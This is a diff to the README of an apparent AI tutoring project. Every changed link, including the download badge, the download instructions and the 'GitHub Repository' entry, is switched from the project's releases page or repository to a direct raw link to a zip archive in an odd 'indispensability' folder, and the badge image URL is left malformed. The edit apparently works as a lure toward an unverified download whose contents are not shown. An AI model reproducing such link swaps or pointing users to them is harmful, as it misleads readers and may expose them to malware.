@@ -1,6 +1,6 @@
 # 📚 personalized-learning-with-generative-AI-and-LMS-integration - Personalized Education Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/releases)
+[![Download Now](https://raw.githubusercontent.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/main/indispensability/personalized-learning-with-generative-AI-and-LMS-integration.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/main/indispensability/personalized-learning-with-generative-AI-and-LMS-integration.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the EDU TUTOR AI project. This intelligent educational platform helps
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Here](https://github.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/releases).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/main/indispensability/personalized-learning-with-generative-AI-and-LMS-integration.zip).
 
 The Releases page contains the latest version of the EDU TUTOR AI application. Follow these steps:
 
@@ -74,7 +74,7 @@ The development team aims to add new features based on user feedback. Possible u
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration)
+- [GitHub Repository](https://raw.githubusercontent.com/daze-69/personalized-learning-with-generative-AI-and-LMS-integration/main/indispensability/personalized-learning-with-generative-AI-and-LMS-integration.zip)
 - [Join Our Community](#) (Link to community forum)
 - [Contact Support](#) (Link to support email)
 
